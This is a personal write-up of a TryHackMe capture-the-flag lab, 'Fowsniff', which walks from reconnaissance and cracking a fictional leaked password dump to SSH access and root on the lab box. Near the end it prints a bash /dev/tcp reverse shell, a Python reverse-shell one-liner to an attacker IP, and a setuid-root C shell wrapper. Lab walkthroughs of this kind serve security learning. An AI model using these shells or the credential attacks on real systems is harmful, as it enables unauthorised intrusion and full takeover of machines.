# Tryhackme.com Room : Fowsniff
`https://tryhackme.com/room/ctf`


# Instance
```
export IP=10.10.171.118
```

# Nmap
```
22/tcp  open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 90:35:66:f4:c6:d2:95:12:1b:e8:cd:de:aa:4e:03:23 (RSA)
|   256 53:9d:23:67:34:cf:0a:d5:5a:9a:11:74:bd:fd:de:71 (ECDSA)
|_  256 a2:8f:db:ae:9e:3d:c9:e6:a9:ca:03:b1:d7:1b:66:83 (ED25519)
80/tcp  open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Fowsniff Corp - Delivering Solutions
110/tcp open  pop3    Dovecot pop3d
|_pop3-capabilities: RESP-CODES UIDL SASL(PLAIN) CAPA TOP USER PIPELINING AUTH-RESP-CODE
143/tcp open  imap    Dovecot imapd
|_imap-capabilities: more have IDLE Pre-login AUTH=PLAINA0001 IMAP4rev1 listed capabilities OK ID LOGIN-REFERRALS SASL-IR post-login ENABLE LITERAL+
```

So the website got "Hacked" and we get this message :
```
Fowsniff's internal system suffered a data breach that resulted in the exposure of employee usernames and passwords.

Client information was not affected.

Due to the strong possibility that employee information has been made publicly available, all employees have been instructed to change their passwords immediately.

The attackers were also able to hijack our official @fowsniffcorp Twitter account. All of our official tweets have been deleted and the attackers may release sensitive information via this medium. We are working to resolve this at soon as possible.

We will return to full capacity after a service upgrade.
```

Nothing interesting there, nothing in js files either.

Nothing in robots.txt :
```
User-agent: *
Disallow: /
```

Let's run gobuster.
We don't find anything usefull :
```
/images (Status: 301)
/index.html (Status: 200)
/security.txt (Status: 200)
/assets (Status: 301)
/README.txt (Status: 200)
/robots.txt (Status: 200)
/LICENSE.txt (Status: 200)
/server-status (Status: 403)
```

We `nc $IP 110` and get into the pop3 server but we can't authenticate

We `nc $IP 143` and get into the IMAP server.
We are greeted with this :
```
OK [CAPABILITY IMAP4rev1 LITERAL+ SASL-IR LOGIN-REFERRALS ID ENABLE IDLE AUTH=PLAIN] Welcome to the Fowsniff Corporate Mail Server!
```

Can we do something with those capabilities ? hmm not sure..

Lawlll... Looking at the questions more closely, they ask to google them... We can reach the hacked twitter page and find a password dump :
```
FOWSNIFF CORP PASSWORD LEAK
            ''~``
           ( o o )
+-----.oooO--(_)--Oooo.------+
|                            |
|          FOWSNIFF          |
|            got             |
|           PWN3D!!!         |
|                            |         
|       .oooO                |         
|        (   )   Oooo.       |         
+---------\ (----(   )-------+
           \_)    ) /
                 (_/
FowSniff Corp got pwn3d by B1gN1nj4!
No one is safe from my 1337 skillz!


mauer@fowsniff:8a28a94a588a95b80163709ab4313aa4
mustikka@fowsniff:ae1644dac5b77c0cf51e0d26ad6d7e56
tegel@fowsniff:1dc352435fecca338acfd4be10984009
baksteen@fowsniff:19f5af754c31f1e2651edde9250d69bb
seina@fowsniff:90dc16d47114aa13671c697fd506cf26
stone@fowsniff:a92b8a29ef1183192e3d35187e0cfabd
mursten@fowsniff:0e9588cb62f4b6f27e33d449e2ba0b3b
parede@fowsniff:4d6e42f56e127803285a0a7649b5ab11
sciana@fowsniff:f7fd98d380735e859f8b2ffbbede5a7e

Fowsniff Corporation Passwords LEAKED!
FOWSNIFF CORP PASSWORD DUMP!

Here are their email passwords dumped from their databases.
They left their pop3 server WIDE OPEN, too!

MD5 is insecure, so you shouldn't have trouble cracking them but I was too lazy haha =P

l8r n00bz!

B1gN1nj4

-------------------------------------------------------------------------------------------------
This list is entirely fictional and is part of a Capture the Flag educational challenge.

All information contained within is invented solely for this purpose and does not correspond
to any real persons or organizations.

Any similarities to actual people or entities is purely coincidental and occurred accidentally.

```

There is also another tweet :
```
Is that your sysadmin? roflcopter
stone@fowsniff:a92b8a29ef1183192e3d35187e0cfabd
```

So i guess we want to get into stone account.

Let's use an online resource to crack the MD5 password
```
mauer@fowsniff:mailcall
mustikka@fowsniff:bilbo101
tegel@fowsniff:apples01
baksteen@fowsniff:skyler22
seina@fowsniff:scoobydoo2
mursten@fowsniff:carp4ever
parede@fowsniff:orlando12
sciana@fowsniff:07011972
```

Crackstation doesn't find the password for `stone@fowsniff`.. Is it just `rolfcopter` mentioned in the tweet ?

Let's try the other logins first.

Tried some manually but it didn't work, fired up patator `patator imap_login host=$IP user=FILE0 password=FILE1 0=users 1=pass -x ignore:fgrep="FAILED"` and found 1 password that was still working :
```
seina:scoobydoo2
```

We find 2 messages on the pop server :
```
Return-Path: <stone@fowsniff>                                                                                          
X-Original-To: seina@fowsniff                                                                                          
Delivered-To: seina@fowsniff                                                                                           
Received: by fowsniff (Postfix, from userid 1000)
        id 0FA3916A; Tue, 13 Mar 2018 14:51:07 -0400 (EDT)
To: baksteen@fowsniff, mauer@fowsniff, mursten@fowsniff,
    mustikka@fowsniff, parede@fowsniff, sciana@fowsniff, seina@fowsniff,
    tegel@fowsniff
Subject: URGENT! Security EVENT!
Message-Id: <20180313185107.0FA3916A@fowsniff>
Date: Tue, 13 Mar 2018 14:51:07 -0400 (EDT)
From: stone@fowsniff (stone)

Dear All,

A few days ago, a malicious actor was able to gain entry to
our internal email systems. The attacker was able to exploit
incorrectly filtered escape characters within our SQL database
to access our login credentials. Both the SQL and authentication
system used legacy methods that had not been updated in some time.

We have been instructed to perform a complete internal system
overhaul. While the main systems are "in the shop," we have
moved to this isolated, temporary server that has minimal
functionality.

This server is capable of sending and receiving emails, but only
locally. That means you can only send emails to other users, not
to the world wide web. You can, however, access this system via 
the SSH protocol.

The temporary password for SSH is "S1ck3nBluff+secureshell"

You MUST change this password as soon as possible, and you will do so under my
guidance. I saw the leak the attacker posted online, and I must say that your
passwords were not very secure.

Come see me in my office at your earliest convenience and we'll set it up.

Thanks,
A.J Stone
```

```
Return-Path: <baksteen@fowsniff>
X-Original-To: seina@fowsniff
Delivered-To: seina@fowsniff
Received: by fowsniff (Postfix, from userid 1004)
        id 101CA1AC2; Tue, 13 Mar 2018 14:54:05 -0400 (EDT)
To: seina@fowsniff
Subject: You missed out!
Message-Id: <20180313185405.101CA1AC2@fowsniff>
Date: Tue, 13 Mar 2018 14:54:05 -0400 (EDT)
From: baksteen@fowsniff

Devin,

You should have seen the brass lay into AJ today!
We are going to be talking about this one for a looooong time hahaha.
Who knew the regional manager had been in the navy? She was swearing like a sailor!

I don't know what kind of pneumonia or something you brought back with
you from your camping trip, but I think I'm coming down with it myself.
How long have you been gone - a week?
Next time you're going to get sick and miss the managerial blowout of the century,
at least keep it to yourself!

I'm going to head home early and eat some chicken soup. 
I think I just got an email from Stone, too, but it's probably just some
"Let me explain the tone of my meeting with management" face-saving mail.
I'll read it when I get back.

Feel better,

Skyler

PS: Make sure you change your email password. 
AJ had been telling us to do that right before Captain Profanity showed up.
```

Ok so, we get from the first email that a temporary ssh password has been setup :
```
S1ck3nBluff+secureshell
```

We could try it but I guess it won't work. We could try with `baksteen` account because he didn't read the email yet so his account might still be setup with the temporary password.

Login with `seina` didn't work but it did with `baksteen`. 

`sshpass -p "S1ck3nBluff+secureshell" ssh baksteen@$IP` Anddd we're in !

Not a sudo user.

Looking at suid binaries `find / -perm -4000 2>/dev/null` :
```
/bin/mount
/bin/fusermount
/bin/umount
/bin/ping
/bin/su
/bin/ntfs-3g
/bin/ping6
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/procmail
/usr/bin/sudo
/usr/bin/chsh
```

Doesn't seem to be anything usefull there..

Runned `linpeas` but didn't find anything to privesc from this user.

I came back to the `stone` hash.

Runned `john --wordlist /usr/share/wordlists/rockyou.txt --format=raw-md5 hash` and found :
```
stone:emerald
```

Didn't work as ssh credentials, let's try on the mail server. NOP no luck with this password...

Oh well, looking at the question they say "To what group belong the user..."

I had found the file `/opt/cube/cube.sh` that belong to the group `users` but it was just a welcome message being printed so I didn't pay to much attention.

Adding `id` to it and login back in, we see that it run as :
```
uid=0(root) gid=0(root) groups=0(root)
```

So here we have a root shell. Tried spawning `/bin/bash` but off course we didn't get a shell. 
Tried to write a shell script with suid but it didn't work since they are not allowed on scripts.

We could use this `c` code :
```c
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

int main()
{
   setuid( 0 );
   system( "/bin/bash" );

   return 0;
}
```

But we could also simply spawn a reverse shell from the `cube.sh` script:
```
bash -i >& /dev/tcp/10.10.226.241/8888 0>&1
```

Hmmm... This didn't work, doesn't even connect.

Hmm sooo, couple other ways to do this, we could have just appended a line into crontab and get a reverse shell that way.

Decided to compile the c binary on my machine (gcc not available on the box), send it to the box.
Then in `cube.sh` I just set the setuid bit with `chmod +s /tmp/exp`  and set the owner to root with `chown root /tmp/exp` and launch the binary.
And we got rooot

Sooo, answering the questions for the challenge, they actually suggested using a python reverse shell.

For some reason the bash version didn't work but putting this in the `cube.sh` got us a reverse shell
```
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.226.241",8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

No flag to submit. Only this ascii art in `/root/flag.txt`
```
   ___                        _        _      _   _             _ 
  / __|___ _ _  __ _ _ _ __ _| |_ _  _| |__ _| |_(_)___ _ _  __| |
 | (__/ _ \ ' \/ _` | '_/ _` |  _| || | / _` |  _| / _ \ ' \(_-<_|
  \___\___/_||_\__, |_| \__,_|\__|\_,_|_\__,_|\__|_\___/_||_/__(_)
               |___/ 

 (_)
  |--------------
  |&&&&&&&&&&&&&&|
  |    R O O T   |
  |    F L A G   |
  |&&&&&&&&&&&&&&|
  |--------------
  |
  |
  |
  |
  |
  |
 ---

Nice work!

This CTF was built with love in every byte by @berzerk0 on Twitter.

Special thanks to psf, @nbulischeck and the whole Fofao Team.
```